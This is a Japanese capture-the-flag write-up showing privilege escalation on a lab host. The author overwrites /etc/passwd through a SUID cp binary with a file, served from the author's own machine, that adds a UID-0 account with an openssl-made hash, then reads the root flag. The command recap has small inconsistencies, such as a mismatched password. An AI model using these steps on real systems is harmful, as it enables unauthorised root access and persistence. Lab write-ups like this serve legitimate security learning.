## PrivEsc2で確認した実行ファイルを利用して、現在の/etc/passwdファイルの内容にroot権限を持ったユーザを加えてください。  
  
一見`cp`するだけなら簡単じゃん！って思ったけど、まじムズかった。  
これヒント見ないでやれた人まじすごいわ。  
いや結果的に見ないでやれたけど、この発想に行きつくまでにどれだけ時間がかかったか。。。  
これは正直思考過程なんか無いに等しかった。  
ほとんど`OSINT`で解いたようなもん。  
  
取りあえず始めた時の認識は、***`cp`に`SUID`がついてるから、どんなファイルもディレクトリもコピーという行為はできるだろう。***  
じゃ実際コピーはできるかもしれないけど、どうやって`rootユーザ`追加すんの？？  
ユーザ追加ってたしか、`adduser`か`useradd`だろ？しかもそれこそ`root`じゃなきゃできないんじゃなかったっけ？  
とりあえず試してみたものの、その通り。しかも`リバースシェル`でやってるから`標準エラー出力`されなくてぱっとみじゃ何がなんやらわかりずらい。  
  
ここから***ユーザ追加***という沼に陥ること７００万年。まさにチンパンジーから人間に進化するほどの時を経て、  
「もしかして、/etc/passwd書き換えてコピーするってことなんじゃね」と閃く。  
閃いたものの、半信半疑。ここ改ざんするだけでユーザ追加されちゃうもんなのか？  
ここまで来たら何でもやってみようということで、とりあえず作戦を考える。  
話しは逸れるが、ここまで来るのまでにも相当いろんなこと試してきて、正直に全部ここに書きだそうと思っていたんだけど、さすがに色々やりすぎてもう整理つかなくなったの割愛することにした。  
悪しからず    
  
### 第６８９７５３４８９７３２９回作戦会議
取りあえず思いついたことを列挙  
- リモートじゃテキストエディタ使えないから、書き換えのファイルはローカル側で作成  
- 中身はリモート側のオリジナルを使わないと不整合みたいの起こりそうだから、一度`cat /etc/passwd`で中身出力して、コピペでローカルに持ってくる。  
- ルートの行をコピーして、最後尾にペースト。第1フィールドの`root`の部分を任意のユーザに書き換える。取り組み始めの当初は、「`nobunaga`を踏み台にして偉くなるんだから、`mitsuhide`にしよ」とか思ってたけど、もうそんな余裕は残っておらず、単純に`user01`と`user02`にした。なぜ二人いるかは下を読んでもらえるとわかる。    
  
#### ハッシュ値問題  
当初から気にはなっていたが、第2フィールドの`x`のところである。ここのハッシュ値になっていて、そのもの自体は`/etc/shadow`に格納されているということ知っていたが、つまるところ`何にしていいのかわからない。`  
思い悩んだ挙句、思いついたOCは以下。  
- O-1：元々パスワード入れるとこなんだから`生のパスワード`いれてもいけるんじゃね。という思考から、`生のパスワードを挿入`
- O-2：パスワードで使ってるハッシュアルゴリズムを調べて、それをぶち込むということで、`ハッシュ値を挿入`  
  
結果的に`O-2`で使ってるハッシュアルゴリズムについては何でもよさそうだけど、`solt付きハッシュ`じゃないとダメっぽいということが分かった。  
いや、正確に言えばデフォルトは`solt付きハッシュ`を使っているので、それを生成した方が無難かなと思ったのでそれを採用。  
  
ここまでで参考にしたサイトを張っておく  
[よくわからないエンジニア -HatenaBlog](https://www.unknownengineer.net/entry/2017/08/16/184537)  
[LinuxでSHA-512のパスワードハッシュ作成方法まとめ -Qiita](https://qiita.com/yumenomatayume/items/2c77ec52e7b2257f6800)  
  
  
## 攻撃開始  
と勇んだものの、↑で考えたこと実施するだけなので、淡々とやる。  
  
```bash
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:113:120:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nobunaga:x:1001:1001::/home/nobunaga:/bin/sh
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:115:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

```  
  
まずは`cat /etc/passwd`で中身をコピー
  
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ openssl passwd -6 -salt ignite pass123
$6$ignite$NpGq6ii4Sbk2v/3uaWdIbMDDbHAt6m.CPYIGYQuoJnMNuKka8NrYFBMd.yYK6n9.3SALkeNDq1CoGbgoW8bgd.

```
  
ここでローカル側に戻り`ソルト付きハッシュ`を生成。  
因みにオプションの`-6`は`SHA-512`で生成するようにしており、`-1`だと`MD5`、`-5`だと`SHA-256`といった具合に`hashアルゴリズム`を指定して生成できるらしい。  
パスワードは分かりやすく`pass123`とした。 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ vim passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:113:120:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nobunaga:x:1001:1001::/home/nobunaga:/bin/sh
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:115:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
user01:passwd12:0:0:root:/root:/bin/bash
user02:$6$ignite$NpGq6ii4Sbk2v/3uaWdIbMDDbHAt6m.CPYIGYQuoJnMNuKka8NrYFBMd.yYK6n9.3SALkeNDq1CoGbgoW8bgd.:0:0:root:/root:/bin/bash

```
　　
最後の２行が、今回`改ざん`した部分である。  
ひとつめの`user01`は`生パスワード`、ふたつめの`user02‘は`ソルト付きハッシュ`をそれぞれ格納している。  
  
```bash
wget -O /tmp/passwd http://10.15.0.6:9000/passwd
  
```
  
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
172.20.15.28 - - [06/Jun/2024 20:05:01] "GET /passwd HTTP/1.1" 200 -

```
  
`wget`でうまく配送できてるっぽい。  
  
```bash
ls -al /tmp
total 48
drwxrwxrwt  2 root     root      4096 Jun  6 11:05 .
drwxr-xr-x 20 root     root      4096 Jun  6 07:37 ..
-rwxrwxrwx  1 nobunaga nobunaga 34952 Jun  4 04:00 nc
-rw-r--r--  1 nobunaga nobunaga  2212 Jun  6 10:59 passwd

```
  
うん、うまく配送できた。  
こっからがまじで分かれ道。ドキドキしながら実行していく。  
  
```bash
cp /tmp/passwd /etc/passwd

```
  
まずは`cp`をして、、  
  
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:113:120:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nobunaga:x:1001:1001::/home/nobunaga:/bin/sh
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:115:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
user01:passwd12:0:0:root:/root:/bin/bash
user02:$6$ignite$NpGq6ii4Sbk2v/3uaWdIbMDDbHAt6m.CPYIGYQuoJnMNuKka8NrYFBMd.yYK6n9.3SALkeNDq1CoGbgoW8bgd.:0:0:root:/root:/bin/bash

```
  
`cat`で見てみたら、ここまではうまくいってるっぽい。  
いやまじ上手くいってくれ。。。  
願いを込めて次を実行。  
  
```bash
su user01
pass12

```
  
```bash
whoami
nobunaga

```
  
信長さま...。  
ま、まぁでももういっちょ！  
  
```bash
su user02
pass123

```
  
```bash
whoami
root

```

うおーーーーーーーー！  
遂に取れた！結構うれしかったな。  
つーことで後は、`フラグ`とるだけということで、  
  
```bash
cat /root/root.txt
Great!TheFirstStepForYourPenTester

```
  
正直超難しかったな。  
書き換えるって発想がなかなかわかなかった。  
でも、`/etc/passwd`ってこんな感じで改ざんするだけでほんとにユーザ追加できちゃうんだね。  
今後永続化とかに使えるかな？とか考えてみたり。  
あと、やっぱ`生パスワード`じゃ上手くいかないんだね。  
ほんとにできないのか、やり方が間違ったのかを評価するほど体力が残ってないので、今回は`できない`という結論で落ち着くことにした。  
もしできたって人いたら教えてね～  
  
  
### コマンド
  
```bash
cat /etc/passwd
  
┌──(kali㉿kali)-[~/Desktop]
└─$ openssl passwd -6 -salt ignite pass123
$6$ignite$NpGq6ii4Sbk2v/3uaWdIbMDDbHAt6m.CPYIGYQuoJnMNuKka8NrYFBMd.yYK6n9.3SALkeNDq1CoGbgoW8bgd.  

┌──(kali㉿kali)-[~/Desktop]
└─$ vim passwd

wget -O /tmp/passwd http://10.15.0.6:9000/passwd

┌──(kali㉿kali)-[~/Desktop]
└─$ python -m http.server 9000

ls -al /tmp

cp /tmp/passwd /etc/passwd

cat /etc/passwd

su user02
pass12

whoami

cat /root/root.txt

```
  

### フラグ  
`Great!TheFirstStepForYourPenTester`  
  
